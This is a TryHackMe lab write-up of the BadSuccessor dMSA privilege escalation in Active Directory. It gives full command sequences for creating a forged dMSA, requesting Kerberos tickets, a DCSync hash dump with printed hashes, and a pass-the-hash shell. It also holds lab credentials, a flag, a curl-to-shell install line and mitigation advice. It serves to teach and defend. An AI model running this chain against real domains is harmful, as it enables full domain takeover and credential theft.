# TryHackMe: AD — BadSuccessor — Writeup

**Room type:** Guided / Walkthrough  
**Category:** Active Directory / Privilege Escalation  
**Tools:** SharpSuccessor, Rubeus (Windows path) | bloodyAD, Impacket (Linux path)  
**CVE:** BadSuccessor — dMSA Privilege Escalation (discovered by Yuval Gordon, Akamai)  

---

## Overview

BadSuccessor is a privilege escalation attack discovered in 2025 by Yuval Gordon at Akamai. It abuses a feature of Windows Server 2025 Active Directory called **delegated Managed Service Accounts (dMSA)** — specifically, the migration mechanic that allows a dMSA to "succeed" another account and inherit its privileges.

The core issue: if a low-privileged user has `CreateChild` rights over an Organizational Unit (OU) in AD, they can create a dMSA object in that OU and configure it to impersonate any account in the domain — including Domain Admin. The dMSA migration system was designed to simplify service account transitions, but the permission model for creating dMSA objects wasn't sufficiently locked down, creating a path from `CreateChild` on an OU to full domain compromise.

This room walks through the attack from both a Windows and Linux perspective, using two different toolchains to achieve the same result.

**Environment:**
- Attacker account: `tbyte` / `P@SSw0rd345`
- Domain: `tryhackme.local`
- Domain Controller: `DC-LAB2025-01.tryhackme.local` (`10.211.101.10`)
- Windows Target: `10.211.101.20`

---

## Task 4 — Reconnaissance: Who Can Create dMSAs?

Before exploiting anything, we need to identify which accounts have the necessary permissions. The room provides `Get-BadSuccessorOUPermissions.ps1`, a script that searches AD for accounts with `CreateChild`, `GenericAll`, `WriteDACL`, or `WriteOwner` rights over OUs.

Running it on the Windows machine:

```powershell
cd C:\PoC\
.\Get-BadSuccessorOUPermissions.ps1
```

```
Identity         OUs
--------         ---
TRYHACKME\hmann  {OU=LabOU,DC=tryhackme,DC=local}
TRYHACKME\tbyte  {OU=LabOU,DC=tryhackme,DC=local}
TRYHACKME\ditall {OU=LabOU,DC=tryhackme,DC=local}
[...]
```

Three accounts have the necessary rights over `LabOU`. We're operating as `tbyte`, which is on the list. The third account is `ditall`.

**Q1 Answer: `ditall`**

The key finding here is the specific permission: `msDS-DelegatedManagedServiceAccount: CREATE_CHILD`. This is the exact object class needed to create a dMSA — and it's a permission that AD administrators often grant without realizing it opens a path to domain admin.

---

## Task 5 — Windows Exploitation Path

The Windows path uses two tools compiled and placed at `C:\PoC\`:
- **SharpSuccessor** — creates and weaponizes the dMSA object
- **Rubeus** — handles the Kerberos ticket operations

### Step 1 — Create and Weaponize the dMSA

```powershell
.\SharpSuccessor.exe add /path:"ou=LabOU,dc=tryhackme,dc=local" /account:tbyte /name:pentest_dmsa /impersonate:Administrator
```

What SharpSuccessor does under the hood:
1. Creates a new dMSA computer object (`pentest_dmsa$`) in LabOU
2. Sets `msDS-ManagedAccountPrecededByLink` to point at the Administrator's DN — telling the DC this dMSA "succeeded" Administrator
3. Sets `msDS-DelegatedMSAState` to `2` (migration complete) — telling the DC the migration already happened
4. Grants the current user (`tbyte`) rights to use the dMSA

The DC is now configured to believe that `pentest_dmsa$` legitimately inherited Administrator's credentials through the migration process. It hasn't — we forged that relationship.

```
[+] Created dMSA object 'CN=pentest_dmsa' in 'ou=LabOU,dc=tryhackme,dc=local'
[+] Successfully weaponized dMSA object
```

### Step 2 — Get a TGT for the Current User

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

`tgtdeleg` abuses Kerberos unconstrained delegation to extract the current user's TGT directly from memory via a legitimate Windows API call. The `/nowrap` flag outputs the base64 ticket on a single line for easy copy-paste.

This gives us `tbyte`'s TGT — which we'll use in the next step to request a ticket as the dMSA.

### Step 3 — Request a krbtgt Ticket as the dMSA

```powershell
.\Rubeus.exe asktgs /targetuser:pentest_dmsa$ /service:krbtgt/tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:<tbyte_TGT_base64>
```

This is the critical step. Rubeus sends a TGS-REQ to the KDC asking for a ticket for `pentest_dmsa$`. Because the DC believes `pentest_dmsa$` succeeded Administrator, it issues a ticket that carries Administrator's privileges. The `/dmsa` flag tells Rubeus to follow the dMSA Kerberos protocol path; `/ptt` injects the ticket directly into the current session's memory.

```
[+] TGS request successful!
[+] Ticket successfully imported!
ServiceName : krbtgt/TRYHACKME.LOCAL
UserName    : pentest_dmsa$ (NT_PRINCIPAL)
```

### Step 4 — Request a CIFS Ticket for the Domain Controller

```powershell
.\Rubeus.exe asktgs /user:pentest_dmsa$ /service:cifs/DC-LAB2025-01.tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:<dMSA_krbtgt_base64>
```

Using the krbtgt ticket from Step 3, we now request a CIFS (SMB) service ticket for the domain controller. With this in memory, we have full SMB access to the DC as Administrator.

### Step 5 — Read the Flag

```powershell
dir \\DC-LAB2025-01.tryhackme.local\c$\Users\Administrator\Desktop\
type \\DC-LAB2025-01.tryhackme.local\c$\Users\Administrator\Desktop\flag.txt
```

```
THM{Successors_Unplanned_Upgrade}
```

**Flag: `THM{Successors_Unplanned_Upgrade}`**

---

## Task 6 — Linux Exploitation Path

The Linux path achieves the same result using bloodyAD and Impacket. It's cleaner — fewer steps, no RDP required, fully scriptable.

### Setup

Add the DC to `/etc/hosts`:

```bash
echo "10.211.101.10  DC-LAB2025-01.tryhackme.local tryhackme DC-LAB2025-01" | sudo tee -a /etc/hosts
```

Install bloodyAD via uv:

```bash
curl -LsSf https://astral.sh/uv/install.sh | sh
uv tool install --python 3.13 git+https://github.com/CravateRouge/bloodyAD
```

### Step 1 — Verify Permissions

```bash
bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' \
  --host DC-LAB2025-01.tryhackme.local get writable --detail
```

The output confirms `msDS-DelegatedManagedServiceAccount: CREATE_CHILD` on `OU=LabOU` — same permission the PowerShell script found, verified through a direct LDAP query.

### Step 2 — Create the dMSA and Get a TGT (One Command)

```bash
bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' \
  --host DC-LAB2025-01.tryhackme.local \
  add badSuccessor pentest3_dmsa \
  --ou "OU=LabOU,DC=tryhackme,DC=local" --prepatch
```

bloodyAD wraps the entire SharpSuccessor + Rubeus tgtdeleg + asktgs sequence into a single command. It creates the weaponized dMSA, requests a TGT impersonating Administrator, and saves everything to a ccache file in one shot:

```
[*] Creating DMSA pentest3_dmsa$ in OU=LabOU,DC=tryhackme,DC=local
[*] Impersonating: CN=Administrator,CN=Users,DC=tryhackme,DC=local
[+] dMSA TGT stored in ccache file pentest3_dmsa_Gd.ccache
```

The `--prepatch` flag is important here — it skips writing the `msDS-Superseded*` attributes on the target object, which some DC patch levels require to avoid access errors.

### Step 3 — Get a CIFS Service Ticket

```bash
export KRB5CCNAME=pentest3_dmsa_Gd.ccache
python3 /usr/share/doc/python3-impacket/examples/getST.py \
  -dc-ip 10.211.101.10 \
  -spn 'cifs/DC-LAB2025-01.tryhackme.local' \
  'tryhackme.local/pentest3_dmsa$' -k -no-pass
```

Impacket's `getST.py` reads the ccache from the `KRB5CCNAME` environment variable and requests a CIFS service ticket for the DC using Kerberos authentication.

### Step 4 — DCSync to Dump All Hashes

```bash
export KRB5CCNAME='pentest3_dmsa$@cifs_DC-LAB2025-01.tryhackme.local@TRYHACKME.LOCAL.ccache'
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  -k -no-pass 'pentest3_dmsa$'@DC-LAB2025-01.tryhackme.local
```

With CIFS access as Administrator, `secretsdump.py` performs a DCSync attack — replicating the NTDS.DIT database using the legitimate DRSUAPI replication protocol. This dumps every password hash in the domain:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:984f755c74dda5d1ec46091043976fec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:52c43c39a2e4a1bef1cf81e06dbc9e06:::
[... all domain accounts ...]
```

### Step 5 — Pass-the-Hash for an Interactive Shell

```bash
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
  'tryhackme.local/administrator@10.211.101.10' \
  -hashes :984f755c74dda5d1ec46091043976fec
```

```
C:\>whoami
tryhackme\administrator
```

Same flag, same domain admin access — achieved entirely from Linux without touching a Windows machine.

---

## Full Attack Chain Summary

```
[Recon]
Get-BadSuccessorOUPermissions.ps1 / bloodyAD get writable
  → tbyte has CREATE_CHILD on OU=LabOU

[Weapon]
SharpSuccessor / bloodyAD add badSuccessor
  → Creates pentest_dmsa$ in LabOU
  → Sets msDS-ManagedAccountPrecededByLink → Administrator
  → Sets msDS-DelegatedMSAState → 2 (migration complete)

[Ticket Chain - Windows]
Rubeus tgtdeleg         → tbyte's TGT from memory
Rubeus asktgs (/dmsa)   → krbtgt TGS as pentest_dmsa$ (carrying Admin privs)
Rubeus asktgs           → CIFS TGS for DC-LAB2025-01
dir/type \\DC\c$\...    → Read Administrator's Desktop

[Ticket Chain - Linux]
bloodyAD add badSuccessor  → dMSA created + TGT issued in one step
getST.py                   → CIFS service ticket
secretsdump.py             → DCSync — full domain hash dump
wmiexec.py -hashes         → Interactive shell as Administrator
```

---

## Why This Works — The Vulnerability Explained

The dMSA migration feature was introduced in Windows Server 2025 to let administrators retire old service accounts gracefully. The intended flow:

1. Create a dMSA
2. Link it to the old service account via `msDS-ManagedAccountPrecededByLink`
3. Set `msDS-DelegatedMSAState` to indicate migration is complete
4. The KDC now issues tickets for the dMSA that include the old account's credentials

The flaw: steps 2 and 3 can be performed by anyone with `CreateChild` on an OU — no special "migration admin" right required. An attacker can link a dMSA to any account in the domain (including Administrator) and mark the migration as complete without actually migrating anything. The KDC has no way to verify the migration was legitimate.

**Prerequisite:** `CreateChild` (or `GenericAll`, `WriteDACL`, `WriteOwner`) on any OU in the domain. This is a permission commonly delegated to helpdesk staff, IT admins, and service accounts — often without realizing it grants a path to full domain compromise.

---

## Mitigation

Microsoft released patches to address this. The mitigations recommended by Akamai in their original research include:

1. **Audit OU permissions** — identify any non-admin accounts with `CreateChild` on OUs and remove or restrict where not needed. The `Get-BadSuccessorOUPermissions.ps1` script from the Akamai GitHub is exactly the tool to do this.

2. **Deploy the patch** — Windows Server 2025 KB5058919 (released May 2025) adds validation to the dMSA migration process.

3. **Monitor for suspicious dMSA creation** — alert on new `msDS-DelegatedManagedServiceAccount` objects being created, especially by non-admin accounts, and on `msDS-ManagedAccountPrecededByLink` being set on newly created dMSAs.

4. **Restrict dMSA creation** — consider using AD delegation controls to prevent non-administrative accounts from creating dMSA objects entirely until the patch is deployed.

---

## Investigative Notes

**The `--prepatch` flag in bloodyAD.** Without it, bloodyAD tries to write `msDS-SupersededServiceAccountState` and `msDS-SupersededManagedAccountLink` directly on the Administrator object — which requires privileges tbyte doesn't have. The `--prepatch` flag tells bloodyAD the DC is pre-patch and skips those writes, relying solely on the dMSA object attributes instead.

**Why four Kerberos tickets?** The Windows path requires four separate Kerberos operations because Kerberos is a multi-step protocol: TGT (proves who you are) → TGS for krbtgt (impersonates the dMSA with inherited rights) → TGS for CIFS (requests access to the specific service). The Linux path compresses the first two steps into bloodyAD's single command.

**DCSync vs. file access.** The Windows path demonstrates direct SMB file access (reading the flag via UNC path). The Linux path goes further — DCSync extracts every credential in the domain, then wmiexec provides an interactive shell. Both demonstrate full domain compromise; DCSync is more impactful in a real engagement because it persists even after the dMSA is removed (you have all the hashes).

**The `pentest_dmsa` objects stay in AD.** Each run of SharpSuccessor or bloodyAD creates a new computer object in LabOU. In a real engagement, cleanup (deleting the dMSA objects) is part of the post-exploitation process.
